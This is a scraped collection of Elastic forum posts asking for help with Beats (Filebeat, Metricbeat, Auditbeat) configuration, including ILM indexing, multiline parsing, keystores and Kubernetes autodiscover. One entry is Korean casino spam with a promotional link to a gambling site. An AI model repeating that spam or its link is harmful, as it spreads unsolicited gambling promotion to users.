    "url": "https://discuss.elastic.co/t/custom-index-name-for-apache-module-but-using-ilm-as-well/226284",
    "title": "Custom Index Name for Apache Module, but using ILM as well",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "dsdameron",
    "date": "April 2, 2020, 8:41pm April 3, 2020, 12:08am April 6, 2020, 9:03pm",
    "body": "I need to setup a Linux system running Apache to send logs into Elastic Search via Filebeat, but have the Apache module send to a different index. This custom index name needs to use the Filebeat/apache module mappings, pipelines, and dashboards. It will also need a custom Index Life Cycle as the Apache logs will have a different retention time. I'm trying to figure out how to correctly do this. I've tagged events coming from the module with the apache_log tag, and I found this helpful article: https://discuss.elastic.co/t/filebeat-apache-module-change-index-name/176955 but I can't use indices when using ILM. I'm not sure how to customize the index name for Apache, specify the ILM i defined within elastic search for Apache, and still send everything else into FileBeat's default. At what point in the configuration and how should this be defined? Also, from playing around thus far, I'm wondering how much manual work is needed to keep this going. Do I need to manually duplicate the template and modify the index pattern and ILM to do this? And each time I apply each update? Or can this be set in Filebeat and Filebeat does it for you on 'filebeat setup' and filebeat updates? Thank you for your help.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d0b73437-0004-4dbd-b7e6-2cb0e1ac24df",
    "url": "https://discuss.elastic.co/t/multiline-parsing-issue/226545",
    "title": "Multiline parsing issue",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "rosseba",
    "date": "April 4, 2020, 11:29pm April 6, 2020, 6:29pm April 6, 2020, 7:16pm",
    "body": "Hi all, filebeat newbie here. I'm trying to reduce this log: [2020-04-05T00:20:00] /usr/bin/rsnapshot -c /etc/rsnapshot_nuc.conf alpha: started [2020-04-05T00:20:00] echo 2123427 > /var/run/rsnapshot_nuc.pid [2020-04-05T00:20:00] /bin/rm -rf /mnt/bck_nuc/rsnapshot/alpha.59/ [2020-04-05T00:20:13] mv /mnt/bck_nuc/rsnapshot/alpha.58/ /mnt/bck_nuc/rsnapshot/alpha.59/ [2020-04-05T00:20:13] mv /mnt/bck_nuc/rsnapshot/alpha.57/ /mnt/bck_nuc/rsnapshot/alpha.58/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.56/ /mnt/bck_nuc/rsnapshot/alpha.57/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.55/ /mnt/bck_nuc/rsnapshot/alpha.56/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.54/ /mnt/bck_nuc/rsnapshot/alpha.55/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.53/ /mnt/bck_nuc/rsnapshot/alpha.54/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.52/ /mnt/bck_nuc/rsnapshot/alpha.53/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.51/ /mnt/bck_nuc/rsnapshot/alpha.52/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.50/ /mnt/bck_nuc/rsnapshot/alpha.51/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.49/ /mnt/bck_nuc/rsnapshot/alpha.50/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.48/ /mnt/bck_nuc/rsnapshot/alpha.49/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.47/ /mnt/bck_nuc/rsnapshot/alpha.48/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.46/ /mnt/bck_nuc/rsnapshot/alpha.47/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.45/ /mnt/bck_nuc/rsnapshot/alpha.46/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.44/ /mnt/bck_nuc/rsnapshot/alpha.45/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.43/ /mnt/bck_nuc/rsnapshot/alpha.44/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.42/ /mnt/bck_nuc/rsnapshot/alpha.43/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.41/ /mnt/bck_nuc/rsnapshot/alpha.42/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.40/ /mnt/bck_nuc/rsnapshot/alpha.41/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.39/ /mnt/bck_nuc/rsnapshot/alpha.40/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.38/ /mnt/bck_nuc/rsnapshot/alpha.39/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.37/ /mnt/bck_nuc/rsnapshot/alpha.38/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.36/ /mnt/bck_nuc/rsnapshot/alpha.37/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.35/ /mnt/bck_nuc/rsnapshot/alpha.36/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.34/ /mnt/bck_nuc/rsnapshot/alpha.35/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.33/ /mnt/bck_nuc/rsnapshot/alpha.34/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.32/ /mnt/bck_nuc/rsnapshot/alpha.33/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.31/ /mnt/bck_nuc/rsnapshot/alpha.32/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.30/ /mnt/bck_nuc/rsnapshot/alpha.31/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.29/ /mnt/bck_nuc/rsnapshot/alpha.30/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.28/ /mnt/bck_nuc/rsnapshot/alpha.29/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.27/ /mnt/bck_nuc/rsnapshot/alpha.28/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.26/ /mnt/bck_nuc/rsnapshot/alpha.27/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.25/ /mnt/bck_nuc/rsnapshot/alpha.26/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.24/ /mnt/bck_nuc/rsnapshot/alpha.25/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.23/ /mnt/bck_nuc/rsnapshot/alpha.24/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.22/ /mnt/bck_nuc/rsnapshot/alpha.23/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.21/ /mnt/bck_nuc/rsnapshot/alpha.22/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.20/ /mnt/bck_nuc/rsnapshot/alpha.21/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.19/ /mnt/bck_nuc/rsnapshot/alpha.20/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.18/ /mnt/bck_nuc/rsnapshot/alpha.19/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.17/ /mnt/bck_nuc/rsnapshot/alpha.18/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.16/ /mnt/bck_nuc/rsnapshot/alpha.17/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.15/ /mnt/bck_nuc/rsnapshot/alpha.16/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.14/ /mnt/bck_nuc/rsnapshot/alpha.15/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.13/ /mnt/bck_nuc/rsnapshot/alpha.14/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.12/ /mnt/bck_nuc/rsnapshot/alpha.13/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.11/ /mnt/bck_nuc/rsnapshot/alpha.12/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.10/ /mnt/bck_nuc/rsnapshot/alpha.11/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.9/ /mnt/bck_nuc/rsnapshot/alpha.10/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.8/ /mnt/bck_nuc/rsnapshot/alpha.9/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.7/ /mnt/bck_nuc/rsnapshot/alpha.8/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.6/ /mnt/bck_nuc/rsnapshot/alpha.7/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.5/ /mnt/bck_nuc/rsnapshot/alpha.6/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.4/ /mnt/bck_nuc/rsnapshot/alpha.5/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.3/ /mnt/bck_nuc/rsnapshot/alpha.4/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.2/ /mnt/bck_nuc/rsnapshot/alpha.3/ [2020-04-05T00:20:14] mv /mnt/bck_nuc/rsnapshot/alpha.1/ /mnt/bck_nuc/rsnapshot/alpha.2/ [2020-04-05T00:20:14] /bin/cp -al /mnt/bck_nuc/rsnapshot/alpha.0 /mnt/bck_nuc/rsnapshot/alpha.1 [2020-04-05T00:20:17] /usr/bin/rsync -a --delete --numeric-ids --relative --delete-excluded --rsh=/usr/bin/ssh root@192.168.100.1:/etc/ /mnt/bck_nuc/rsnapshot/alpha.0/nuc/ [2020-04-05T00:20:17] /usr/bin/rsync -a --delete --numeric-ids --relative --delete-excluded --rsh=/usr/bin/ssh root@192.168.100.1:/root/ /mnt/bck_nuc/rsnapshot/alpha.0/nuc/ [2020-04-05T00:20:17] /usr/bin/rsync -a --delete --numeric-ids --relative --delete-excluded --rsh=/usr/bin/ssh root@192.168.100.1:/home/ /mnt/bck_nuc/rsnapshot/alpha.0/nuc/ [2020-04-05T00:20:18] /usr/bin/rsync -a --delete --numeric-ids --relative --delete-excluded --rsh=/usr/bin/ssh root@192.168.100.1:/var/unbound/ /mnt/bck_nuc/rsnapshot/alpha.0/nuc/ [2020-04-05T00:20:18] /usr/bin/rsync -a --delete --numeric-ids --relative --delete-excluded --rsh=/usr/bin/ssh root@192.168.100.1:/office_fs/ /mnt/bck_nuc/rsnapshot/alpha.0/nuc/ [2020-04-05T00:20:19] /usr/bin/rsync -a --delete --numeric-ids --relative --delete-excluded --rsh=/usr/bin/ssh root@192.168.100.1:/mnt/500/bck_bth/alpha.0/ /mnt/bck_nuc/rsnapshot/alpha.0/nuc/ [2020-04-05T00:20:21] /usr/bin/rsync -a --delete --numeric-ids --relative --delete-excluded --rsh=/usr/bin/ssh root@192.168.100.1:/mnt/500/bck_daily/alpha.0/ /mnt/bck_nuc/rsnapshot/alpha.0/nuc/ [2020-04-05T00:20:25] /usr/bin/rsync -a --delete --numeric-ids --relative --delete-excluded --rsh=/usr/bin/ssh root@192.168.100.1:/mnt/500/bck_ts10/alpha.0/ /mnt/bck_nuc/rsnapshot/alpha.0/nuc/ [2020-04-05T00:20:31] /usr/bin/rsync -a --delete --numeric-ids --relative --delete-excluded --rsh=/usr/bin/ssh root@192.168.100.1:/mnt/500/bck_w10server/alpha.0/ /mnt/bck_nuc/rsnapshot/alpha.0/nuc/ [2020-04-05T00:20:31] /usr/bin/rsync -a --delete --numeric-ids --relative --delete-excluded --rsh=/usr/bin/ssh root@192.168.100.1:/mnt/500/bck_weekly/alpha.0/ /mnt/bck_nuc/rsnapshot/alpha.0/nuc/ [2020-04-05T00:20:33] touch /mnt/bck_nuc/rsnapshot/alpha.0/ [2020-04-05T00:20:33] rm -f /var/run/rsnapshot_nuc.pid [2020-04-05T00:20:33] /usr/bin/rsnapshot -c /etc/rsnapshot_nuc.conf alpha: completed successfully obtaining just the first and the last line, like this: [2020-04-05T00:20:00] /usr/bin/rsnapshot -c /etc/rsnapshot_nuc.conf alpha: started [2020-04-05T00:20:33] /usr/bin/rsnapshot -c /etc/rsnapshot_nuc.conf alpha: completed successfully Filebeat (v7.6.2) processing files with output to graylog. I already tried every config, multiline examples and eventually The Go Playgroud, without success. Relevant config from /etc/filebeat/filebeat.yml file: fields_under_root: true fields.source: v2 ... filebeat.inputs: - type: log enable: true tags: [\"rsnapshot\"] multiline.pattern: 'rsnapshot -c' multiline.negate: true multiline.match: after paths: - /path/rsnapshot/* still looking for the correct multiline pattern to use. Thanks for any help, -f",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "89fe5ee2-7853-4614-b4ef-3c771b724867",
    "url": "https://discuss.elastic.co/t/metricbeat-mssql-keystore/222933",
    "title": "Metricbeat MSSQL - keystore",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "shortcommand",
    "date": "March 10, 2020, 12:42pm April 6, 2020, 6:52pm",
    "body": "Hi, I've a problem with using keystore to store passwords for DB connection in the MSSQL module. I've created a keystore and and added a key called SA_PW. I can see this key in the keystore when I list all keys in the keystore. This is my MSSQL module config: - module: mssql metricsets: - \"transaction_log\" - \"performance\" hosts: [\"MyMachine\"] username: sa password: \"${SA_PW}\" period: 10s If if use the password in plaintext it works. Error message from log: |2020-03-10T13:38:40.496+0100|INFO|instance/beat.go:445|metricbeat stopped. |2020-03-10T13:38:40.501+0100|ERROR|instance/beat.go:933|Exiting: 2 errors: host parsing failed for mssql-transaction_log: missing field accessing '0.password' (source:'C:\\metricbeat-7.6.0-windows-x86_64\\modules.d\\mssql.yml');| Am I doing something wrong here? Thanks in advance.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "82c31d00-55d8-4d9c-aa51-7af877eb6707",
    "url": "https://discuss.elastic.co/t/metricbeat-showing-zero-percent-cpu-utilization/223768",
    "title": "Metricbeat showing Zero_Percent CPU utilization",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Saravana37",
    "date": "March 16, 2020, 1:27pm April 6, 2020, 5:03pm",
    "body": "Hello All , I have recently changed the period from 10s to 3m for system module in metricbeat.yml (system.yml) . Earlier when it was 10s i was able to see the CPU data in Host system dashboard. Now i don't see the data always . It is like when metricbeat fetches data (at 3rd minute) data is shown. How can we show in dashboard which was last recorded value other than zero . Is there anything that i have to change in the yml file ? Thanks and Regards Saravana S Zero_Percentage1646×530 62.4 KB",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "72e195d5-aa37-440e-bcf2-70159e8874c6",
    "url": "https://discuss.elastic.co/t/return-group1-from-regex-not-fullmatch/224420",
    "title": "Return Group1 from regex not fullmatch",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "quixter",
    "date": "March 20, 2020, 12:54pm March 23, 2020, 5:36pm March 23, 2020, 6:03pm March 23, 2020, 6:50pm April 6, 2020, 1:49pm",
    "body": "Hi, I'm pretty new to both ELK and Filebeat. I'm trying to get a custom field built using a regex value. I'm having to use javascript which seems to be complicating things. I have the following regex .com/([A-Za-z0-9]+)/ it returns .com/clientname/ as a fullmatch and clientname as the group one match. The group 1 match is the desired match for the custom field. Is there a way to do that. Below is what I have in the filebeat yml. processors: script: lang: javascript id: clientid_regex source: > function process(event) { var cid; var message; message=event.Get(\"message\"); if ( cid = message.match(/.com/([A-Za-z0-9]+)//) ) { event.Put(\"rcm.clientid\", cid); } }",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "f919fd8d-2ead-46be-b6ab-166930da9aee",
    "url": "https://discuss.elastic.co/t/one-cluster-to-monitor-them-all/226598",
    "title": "One cluster to monitor them all",
    "category": [
      "Beats"
    ],
    "author": "ffknob",
    "date": "April 5, 2020, 10:07pm April 6, 2020, 6:43am April 6, 2020, 11:50am April 6, 2020, 1:03pm",
    "body": "Hi there So I'm planning to deploy a single cluster to centralize logs and metrics from a group of different clients. The scope of this would be metrics from hosts and services (Metricbeat), log files (Filebeat), network (Packetbeat) and auditing info (Auditbeat and Winlogbeat). I'm also planning to monitor client's own Elasticsearch clusters. I have a lot of questions on how to deploy this solution, most of them related to how to integrate components with different versions and also how to segment data from each client so one client can't see other client's data. Monitoring Cluster: Elastic Cloud 7.6.2 Here are some of my doubts: Should all my Beats' version be compatible with my cluster's? Say exaclty 7.6.2, or maybe I can install a future 7.6.3 release? What about 7.7.0 (remember my cluster is 7.6.2)? Can a 7.6.2 Metricbeat get data from a 5.6 Elasticsearch cluster? Are all Kibana Dashboards ready to handle missing Metricbeat data (suppose 5.6 doesn't have some attribute)? I'm currently sending some tags and some root level custom fields (client.id, client.name, ...) from the Beats. I think I'll use the client.* to build some Dahsboards per client, maybe create some Kibana Spaces with a query for that field... Is that the way to go if I plan to give the client access to his data? Thank you very much for all thoughts on this and stay safe!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "52b761e1-6d53-4b97-b195-93245686d568",
    "url": "https://discuss.elastic.co/t/suricata-module-missing-mapping-for-tenant-id/226708",
    "title": "Suricata Module missing mapping for tenant_id",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "April 6, 2020, 12:27pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "3141b5f9-e0f0-4490-bd77-6b32cda58de1",
    "url": "https://discuss.elastic.co/t/filebeat-azure-module-error/225757",
    "title": "Filebeat Azure Module Error",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "craigothy",
    "date": "March 30, 2020, 10:16pm March 31, 2020, 9:04am March 31, 2020, 2:03pm April 2, 2020, 1:10pm March 31, 2020, 6:29pm April 1, 2020, 8:31am April 1, 2020, 4:20pm April 6, 2020, 9:47am",
    "body": "When starting filebeat after enabling an configuring the azure module in 7.6.1 I get the following error: ERROR [azure-eventhub input] azureeventhub/input.go:116 illegal base64 data at input byte 0 {\"connection string\": \"Endpoint=sb://mytest.servicebus.windows.net/;SharedAccessKeyName=mylabpolicy;SharedAccessKey=mybase64key\"} Any idea what might be causing this? Thank you!",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "1aa16608-8a7a-431d-a472-0d6ee59e525b",
    "url": "https://discuss.elastic.co/t/specify-port-range-of-http-protocol/226060",
    "title": "Specify port range of http protocol",
    "category": [
      "Beats",
      "Packetbeat"
    ],
    "author": "e997cd7e8d9915436150",
    "date": "April 1, 2020, 2:16pm April 5, 2020, 9:49am April 5, 2020, 9:49am",
    "body": "Hello, I want to specify port range of http protocol like [80-65000]. Is it impossible? Any advice is much appreciated.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "5088cbd6-18e1-40da-82c1-dea85784a685",
    "url": "https://discuss.elastic.co/t/multiple-filebeat-inputs-to-different-logstash-ports/226273",
    "title": "Multiple Filebeat Inputs to different Logstash ports",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "radd",
    "date": "April 2, 2020, 7:07pm April 3, 2020, 9:00am April 4, 2020, 10:20am",
    "body": "Hi, I am trying to send 3 total different logs from server A using filebeat, to server B running logstash on 3 different ports, based on different pipelines. Server A,filebeat, file_1.log ---------> Server B, logstash with pipeline_1 on prot 5051 Server A,filebeat, file_2.log ---------> Server B, logstash with pipeline_2 on prot 6051 Server A,filebeat, file_3.log ---------> Server B, logstash with pipeline_3 on prot 7051 file_1.log <> file_2.log <> file_3.log (different log files on server A) pipeline_1 <> pipeline_2 <> pipeline_3 (different conf files on server B) Could I start 3 different filebeat instances on server A with 3 different filebeat.yml configurations (when installation is rpm based). I really don't have much experience in this area. Could you please help me to resolve this problem. I am using ELK 7.6 Many thanks, rd",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7966311d-0b47-4716-af62-406e9f0d9bce",
    "url": "https://discuss.elastic.co/t/filebeat-wrong-multiline-merging/225881",
    "title": "Filebeat: wrong multiline merging",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "agapoff",
    "date": "March 31, 2020, 2:11pm April 1, 2020, 10:14am April 1, 2020, 10:20am April 4, 2020, 10:14am",
    "body": "I am trying to run filebeat daemonset in Kubernetes cluster. It is expected to honor the multiline log entries and also parse json log entries. This is the config snippet: filebeat.autodiscover: providers: - type: kubernetes node: ${NODE_NAME} hints.enabled: true hints.default_config: type: container paths: - /var/log/containers/*${data.kubernetes.container.id}.log multiline.pattern: '^[0-9]{4}-[0-9]{2}-[0-9]{2}' multiline.negate: true multiline.match: after multiline.max_lines: 50 multiline.timeout: 3s processors: - add_cloud_metadata: - drop_event: when: or: - equals: kubernetes.namespace: \"kube-system\" - equals: kubernetes.namespace: \"metallb-system\" - decode_json_fields: fields: [\"message\"] process_array: false max_depth: 1 target: \"\" overwrite_keys: true Everything works as desired except for one issue: some json logs are being merged together when this is not expected: multiline1190×514 53.9 KB Does anybody know how to deal with it?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2835c514-ce83-4ad2-98b4-4ae5fb7b3f66",
    "url": "https://discuss.elastic.co/t/unable-to-get-user-name-in-audit-beat-file-integrity/224524",
    "title": "Unable to Get user name in Audit beat File Integrity",
    "category": [
      "Beats",
      "Auditbeat"
    ],
    "author": "",
    "date": "March 21, 2020, 2:02pm April 4, 2020, 9:03am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e8c5b732-245e-4248-aeba-7aac1d3a2298",
    "url": "https://discuss.elastic.co/t/how-to-automatically-change-the-file-name-output-by-auditbeat-yml/225529",
    "title": "How to automatically change the file name output by Auditbeat.yml",
    "category": [
      "Beats",
      "Auditbeat"
    ],
    "author": "Ryo_Takeuchi",
    "date": "March 29, 2020, 2:19am April 4, 2020, 8:55am",
    "body": "Is it possible to set variable information (date information etc ...) in the file name with the File option of Configure the output? For example, filename_yyyymmdd_hhmmss.log etc ... Or is there any other way to change the file name dynamically when outputting the collected logs to a file?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "793d5b4d-4c8d-47f7-92da-ff6134825318",
    "url": "https://discuss.elastic.co/t/waldheim33-com-yes/226500",
    "title": "않은 waldheim33.com/yes/ - 샌즈카지노",
    "category": [
      "Beats"
    ],
    "author": "moondrew3w",
    "date": "April 4, 2020, 8:32am",
    "body": "뭔가 좋지 않은 https://waldheim33.com/yes/ - 샌즈카지노기분을 더나인카지노느낀 코인카지노기현이 퍼스트카지노움찔하며 더킹카지노한영의 우리카지노등뒤로 물러섰다. 한영과 함께 온 유택천의 패거리도 왠지 모를 기선에 뒤로 물러났다. 민형",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "1459c0d5-aed4-4eab-bd06-4e914d198984",
    "url": "https://discuss.elastic.co/t/filebeat-stops-in-docker-container/226323",
    "title": "Filebeat stops in docker container",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "April 3, 2020, 5:23am April 3, 2020, 8:50am April 3, 2020, 8:33pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d96d3779-5a18-4de8-9960-05cfffd6838c",
    "url": "https://discuss.elastic.co/t/build-filebeat-x-pack-modules-from-source-fails/226128",
    "title": "Build filebeat x-pack modules from source fails",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Mike_Ware",
    "date": "April 1, 2020, 9:33pm April 2, 2020, 8:40am April 2, 2020, 4:54pm April 2, 2020, 11:57pm April 3, 2020, 6:12pm April 3, 2020, 4:02pm April 3, 2020, 4:42pm April 3, 2020, 5:29pm April 3, 2020, 5:52pm April 3, 2020, 6:14pm April 3, 2020, 6:40pm April 3, 2020, 7:58pm",
    "body": "I have managed to build file beat and base modules from source found at https://github.com/elastic/beats . When I try to build the modules in beats/x-pack/filebeat I receive the following error with build launched at src/github.com/elastic/beats/x-pack/filebeat mage build >> build: Building filebeat ../libbeat/cmd/inject.go:17:2: build constraints exclude all Go files in /root/go/src/github.com/elastic/beats/x-pack/libbeat/processors/add_cloudfoundry_metadata Error: running \"go build -o filebeat -ldflags -s -X github.com/elastic/beats/v7/libbeat/version.buildTime=2020-04-01T21:26:46Z -X github.com/elastic/beats/v7/libbeat/version.commit=0ef472268ea41881f81accabe2af6cfb72eef682\" failed with exit code 1 I have little experience with Go and so am lost as far as troubleshooting this goes. The one things that I notice is the reference to the github.com/elastic/beats/v7 which does not exists in the source tree. go version go1.14.1 freebsd/amd64 go env : GO111MODULE=\"\" GOARCH=\"amd64\" GOBIN=\"\" GOCACHE=\"/root/.cache/go-build\" GOENV=\"/root/.config/go/env\" GOEXE=\"\" GOFLAGS=\"\" GOHOSTARCH=\"amd64\" GOHOSTOS=\"freebsd\" GOINSECURE=\"\" GONOPROXY=\"\" GONOSUMDB=\"\" GOOS=\"freebsd\" GOPATH=\"/root/go\" GOPRIVATE=\"\" GOPROXY=\"https://proxy.golang.org,direct\" GOROOT=\"/usr/local/go\" GOSUMDB=\"sum.golang.org\" GOTMPDIR=\"\" GOTOOLDIR=\"/usr/local/go/pkg/tool/freebsd_amd64\" GCCGO=\"gccgo\" AR=\"ar\" CC=\"clang\" CXX=\"clang++\" CGO_ENABLED=\"1\" GOMOD=\"/root/go/src/github.com/elastic/beats/go.mod\" CGO_CFLAGS=\"-g -O2\" CGO_CPPFLAGS=\"\" CGO_CXXFLAGS=\"-g -O2\" CGO_FFLAGS=\"-g -O2\" CGO_LDFLAGS=\"-g -O2\" PKG_CONFIG=\"pkg-config\" GOGCCFLAGS=\"-fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=/tmp/go-build279549248=/tmp/go-build -gno-record-gcc-switches\" Thanks in advance for any help.",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "1900e13f-d871-495b-b9d1-68f34e25dad4",
    "url": "https://discuss.elastic.co/t/changes-of-hostname-or-ip-addresses-does-not-updates-host-metadata-until-metricbeat-restart-on-nodes/226403",
    "title": "Changes of hostname or ip addresses does not updates host metadata until metricbeat restart on nodes",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "mmelyp",
    "date": "April 3, 2020, 12:43pm April 3, 2020, 3:20pm April 3, 2020, 3:39pm April 3, 2020, 3:53pm",
    "body": "Hi there, I have an issue here with metricbeat. I found out that if I change the hostname of my debian nodes (hostnamectl set-hostname FQDN), or if i add or remove IP addresses, i always have to restart metricbeat in order to receive the host metadata updated. Is this a bug, or it is simply this use case not implemented? Greetings and thanks in advance. Great product by the way.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "25318c63-dc78-4332-9157-420071ccc5f3",
    "url": "https://discuss.elastic.co/t/error-creating-runner-from-config-can-only-start-an-input-when-all-related-states-are-finished/226422",
    "title": "Error creating runner from config: Can only start an input when all related states are finished",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "viveknagar",
    "date": "April 3, 2020, 3:08pm",
    "body": "Hello All, I am getting error \"Error creating runner from config: Can only start an input when all related states are finished\" ,while using autodiscover in fIlebeat 7.4.2 . Below is my configuration file \"filebeat.yml\" filebeat.autodiscover: providers: - type: kubernetes host: ${K8S_NODE} hints.enabled: false hints.default_config: type: container finished: true paths: - /var/lib/docker/containers/${data.kubernetes.container.id}/${data.kubernetes.container.id}-json.log exclude_files: - filebeat-.*\\.log - logstash-.*\\.log - kibana-.*\\.log - es-cluster-.*\\.log output.logstash: hosts: [\"${LS_HOST}\"] xpack.monitoring: enabled: true elasticsearch: hosts: [\"${ES_HOST}\"] I have tried a lot of option to resolve it , but didn't get success . Thank you in advance.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "67e09e24-fe77-43c7-b653-47ac281ea803",
    "url": "https://discuss.elastic.co/t/kibana-dashboard-i-am-using-elastic-cloud-trial-version-and-filebeat-is-running-but-failed-to-load-fllebeat-index-pattern-on-kibana/226023",
    "title": "Kibana Dashboard: I am using elastic cloud trial version and filebeat is running but failed to load fllebeat index pattern on kibana",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Manav_Chopra",
    "date": "April 1, 2020, 10:54am April 2, 2020, 8:22am April 3, 2020, 12:05pm April 3, 2020, 2:29pm",
    "body": "I am working on windows system and working on elastic cloud: elasticsearch and kibana I have installed filebeat as well and configured properly . In console if i run filebeat -e, it is running but on kibana nothing is shown. No index pattern is coming i.e filebeat-* is expected. I have enabled the input configuration in filebeat.yml to be true and set the path to C:\\Program Files\\filebeat\\logs* setup.dashboards.enabled: true setup.kibana,host: pointed to kibana endpoint url of elastic cloud Please refer attached images as well and let me know what i am missing? test2877×506 14.1 KB test31358×561 43.3 KB test4608×552 30.1 KB",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3eec9eb9-e328-4a26-9503-ec260c365cd6",
    "url": "https://discuss.elastic.co/t/seeking-clarification-on-how-filebeat-setup-works-with-rollover-alias-defined-etc/226406",
    "title": "Seeking clarification on how 'filebeat setup' works with rollover_alias defined, etc",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "dsdameron",
    "date": "April 3, 2020, 1:19pm",
